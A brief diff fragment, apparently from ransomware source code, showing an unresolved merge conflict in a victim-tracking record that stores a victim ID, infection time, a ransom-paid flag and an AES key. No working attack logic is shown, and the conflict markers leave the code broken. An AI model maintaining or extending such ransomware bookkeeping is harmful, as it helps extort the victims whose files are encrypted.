@@ -47,7 +47,11 @@ post_data = {
 viclist = [
     {
         'id': victim_id,
+<<<<<<< HEAD
         'inf_time': time.time()
+=======
+        'inftime': time.ctime()
+>>>>>>> b33833f424f190a3d45f18dd6de8409bdcb4859d
         'ransom': False,
         'AES_key': aes_key
     }
